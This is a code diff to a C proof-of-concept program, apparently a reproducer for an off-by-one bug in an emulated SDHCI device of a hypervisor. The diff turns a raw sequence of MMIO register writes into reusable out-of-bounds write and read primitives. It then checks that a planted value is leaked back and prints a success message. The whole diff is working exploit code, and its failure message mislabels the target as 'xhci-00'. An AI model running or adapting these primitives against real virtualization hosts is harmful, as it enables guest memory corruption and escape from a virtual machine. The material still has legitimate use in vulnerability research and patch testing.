@@ -99,6 +99,41 @@ typedef struct ADMADescr {
     uint32_t addr_and_attr;
 } ADMADescr;
 
+
+uint64_t admadescr0_phys = 0;
+
+void sdhci_off_by_one_write(uint32_t value) {
+    // reset
+    mmio_writeb(0x2f, 0x01);
+
+    mmio_writed(0x58, (uint32_t)admadescr0_phys);
+    mmio_writew(0x2c, 0xd397);
+    mmio_writed(0x28, 0x5e72c648);
+    mmio_writed(0x04, 0x000035b1); 
+    mmio_writed(0x0c, 0x406075a5);
+    // set SDHC_DATA_AVAILABLE
+    mmio_writed(0x28, 0x1fc9595d);
+    mmio_writed(0x28, 0x014e9bd5);
+    // write
+    mmio_writed(0x20, value);
+}
+
+uint32_t sdhci_off_by_one_read() {
+    // reset
+    mmio_writeb(0x2f, 0x01);
+
+    mmio_writed(0x58, (uint32_t)admadescr0_phys);
+    mmio_writew(0x2c, 0xd397);
+    mmio_writed(0x28, 0x5e72c648);
+    mmio_writed(0x04, 0x458735b1);
+    mmio_writed(0x0c, 0x406075b7);
+    // set SDHC_DATA_AVAILABLE
+    mmio_writed(0x28, 0x1fc9595d);
+    mmio_writed(0x28, 0x014e9bd5);
+    // read
+    return mmio_readd(0x20);
+}
+
 int main(int argc, char **argv) {
     printf("[+]\n[+] Reproduce sdhci-00: start\n[+]\n");
 
@@ -148,25 +183,20 @@ int main(int argc, char **argv) {
 
     // prepare the dependent buffer
     ADMADescr *admadescr0 = (ADMADescr *)calloc_256aligned(sizeof(ADMADescr));
-    uint64_t admadescr0_phys = gva_to_gpa(admadescr0);
+    admadescr0_phys = gva_to_gpa(admadescr0);
     // uint8_t *block = (uint8_t *)calloc_256aligned(0x200);
     // uint64_t block_phys = gva_to_gpa(block);
     admadescr0->addr_and_attr |= 0xcfd83000;
     admadescr0->addr_and_attr |= 0x69;
 
-    // reset
-    mmio_writeb(0x2f, 0x01);
+    sdhci_off_by_one_write(0xff);
+    uint32_t leaked_data = sdhci_off_by_one_read();
 
-    mmio_writed(0x58, (uint32_t)admadescr0_phys);
-    mmio_writew(0x2c, 0xd397);
-    mmio_writed(0x28, 0x5e72c648);
-    mmio_writed(0x04, 0x458735b1);
-    mmio_writed(0x0c, 0x406075b7);
-    mmio_writed(0x28, 0x1fc9595d);
-    mmio_writed(0x28, 0x014e9bd5);
-
-    uint32_t leaked_data = mmio_readd(0x20);
-    printf("[+] leaked_data=0x%x\n", leaked_data);
+    if (leaked_data == 0xff) {
+        printf("[+]\n[+] Bingo! Got you!: leaked_data=0x%x\n[+]\n", leaked_data);
+    } else {
+        printf("[+]\n[+] Reproduce xhci-00: fail\n[+]\n");
+    }
 
     return 0;
 }
